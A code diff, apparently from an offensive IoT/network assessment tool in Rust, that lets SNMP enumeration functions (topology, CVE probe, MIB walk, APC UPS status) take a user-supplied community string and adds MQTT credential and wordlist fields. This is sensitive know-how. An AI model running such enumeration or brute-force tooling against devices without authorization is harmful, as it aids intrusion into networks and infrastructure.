-    let Some(community) = client::discover_community(ip, p) else {
-        out("[-] No SNMP response");
-        return;
+    let community_owned;
+    let community = if input.trim().is_empty() {
+        let Some(c) = client::discover_community(ip, p) else {
+            out("[-] No SNMP response — try supplying the community string manually");
+            return;
+        };
+        community_owned = c;
+        community_owned.as_str()
+    } else {
+        input.trim()
     };
-    match enumerate::get_topology(ip, p, &community) {
+    match enumerate::get_topology(ip, p, community) {
         Ok(lines) if lines.is_empty() => out("[!] No IP/route/ARP data returned"),
         Ok(lines) => {
             for l in &lines { out(l); }
@@ -6634,15 +7300,22 @@ fn exploit_snmp_community_scan(ip: &str, port: u16, out: &impl Fn(&str)) {
     }
 }
 
-fn exploit_snmp_cve_probe(ip: &str, port: u16, out: &impl Fn(&str)) {
+fn exploit_snmp_cve_probe(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::snmp::{client, enumerate};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] SNMP CVE probe on {ip}:{p}..."));
-    let Some(community) = client::discover_community(ip, p) else {
-        out("[-] No SNMP response");
-        return;
+    let community_owned;
+    let community = if input.trim().is_empty() {
+        let Some(c) = client::discover_community(ip, p) else {
+            out("[-] No SNMP response — try supplying the community string manually");
+            return;
+        };
+        community_owned = c;
+        community_owned.as_str()
+    } else {
+        input.trim()
     };
-    match enumerate::get_system_info(ip, p, &community) {
+    match enumerate::get_system_info(ip, p, community) {
         Ok(info) => {
             out(&format!("  sysDescr = {}", info.descr));
             out(&format!("  sysOID   = {}", info.object_id));
@@ -6664,13 +7337,26 @@ fn exploit_snmp_cve_probe(ip: &str, port: u16, out: &impl Fn(&str)) {
 fn exploit_snmp_walk(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::snmp::client;
     let p = if port == 0 { client::SNMP_PORT } else { port };
-    let root = if input.trim().is_empty() { "1.3.6.1.2.1.1" } else { input.trim() };
-    out(&format!("[*] SNMP walk {root} on {ip}:{p}..."));
-    let Some(community) = client::discover_community(ip, p) else {
-        out("[-] No SNMP response");
-        return;
+    let (root, user_community) = match input.trim().rsplit_once(' ') {
+        Some((oid, comm)) if !comm.trim().is_empty() => (oid.trim(), Some(comm.trim())),
+        _ => {
+            let raw = input.trim();
+            (if raw.is_empty() { "1.3.6.1.2.1.1" } else { raw }, None)
+        }
     };
-    match client::walk(ip, p, &community, root) {
+    out(&format!("[*] SNMP walk {root} on {ip}:{p}..."));
+    let community_owned;
+    let community = if let Some(c) = user_community {
+        c
+    } else {
+        let Some(c) = client::discover_community(ip, p) else {
+            out("[-] No SNMP response — try supplying the community string manually");
+            return;
+        };
+        community_owned = c;
+        community_owned.as_str()
+    };
+    match client::walk(ip, p, community, root) {
         Ok(entries) if entries.is_empty() => out("[!] No results (end of MIB or no access)"),
         Ok(entries) => {
             for (o, v) in &entries { out(&format!("  {o} = {}", v.display())); }
@@ -6700,19 +7386,26 @@ fn exploit_snmp_test_write(ip: &str, port: u16, input: &str, out: &impl Fn(&str)
     }
 }
 
-fn exploit_snmp_apc_status(ip: &str, port: u16, out: &impl Fn(&str)) {
+fn exploit_snmp_apc_status(ip: &str, port: u16, input: &str, out: &impl Fn(&str)) {
     use crate::vendors::snmp::{client, oids};
     let p = if port == 0 { client::SNMP_PORT } else { port };
     out(&format!("[*] APC UPS status from {ip}:{p}..."));
-    let Some(community) = client::discover_community(ip, p) else {
-        out("[-] No SNMP response");
-        return;
+    let community_owned;
+    let community = if input.trim().is_empty() {
+        let Some(c) = client::discover_community(ip, p) else {
+            out("[-] No SNMP response — try supplying the community string manually");
+            return;
+        };
+        community_owned = c;
+        community_owned.as_str()
+    } else {
+        input.trim()
     };
     let apc_oids = [oids::APC_MODEL, oids::APC_FIRMWARE, oids::APC_SERIAL,
                     oids::APC_BATTERY_STATUS, oids::APC_RUNTIME_MINS,
                     oids::APC_INPUT_VOLTAGE, oids::APC_OUTPUT_LOAD_PCT, oids::APC_OUTPUT_STATUS];
     let labels = ["Model", "Firmware", "Serial", "Battery", "Runtime(min)", "InputV", "Load%", "OutStatus"];
-    match client::get_multi(ip, p, &community, &apc_oids) {
+    match client::get_multi(ip, p, community, &apc_oids) {
         Ok(results) => {
             for (i, (_, val)) in results.iter().enumerate() {
                 out(&format!("  {:<14} = {}", labels[i], val.display()));
@@ -7012,6 +7705,12 @@ mod tests {
             mqtt_attack_lines: Vec::new(),
             mqtt_attack_scroll: 0,
             mqtt_attack_label: String::new(),
+            mqtt_username: String::new(),
+            mqtt_password: String::new(),
+            mqtt_conn: MqttConnSettings::default(),
+            mqtt_attack_running: false,
+            wordlist_path: None,
+            export_format: ExportFormat::default(),
         }
     }
 
